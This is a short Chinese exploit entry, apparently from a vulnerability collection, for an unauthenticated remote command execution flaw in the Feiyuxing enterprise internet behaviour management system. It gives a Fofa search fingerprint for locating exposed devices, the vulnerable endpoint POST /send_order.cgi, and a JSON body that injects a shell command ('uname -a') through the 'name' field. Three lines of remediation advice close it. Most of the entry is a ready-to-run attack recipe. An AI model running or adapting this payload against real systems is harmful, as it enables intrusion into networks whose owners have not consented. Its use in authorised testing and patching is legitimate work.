# 飞鱼星上网行为管理系统企业版前台RCE

- **系统**：飞鱼星上网行为管理系统企业版前台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="飞鱼星企业"`
- **请求**：`POST /send_order.cgi?parameter=operation HTTP/1.1`

**请求体 / payload**
```
1. Fofa
title="飞鱼星企业"
1. 部分界面如下
3、隐患url,复现如下
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
{"opid":"777777777777777777","name":";uname -a;echo ","type":"rest"}
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。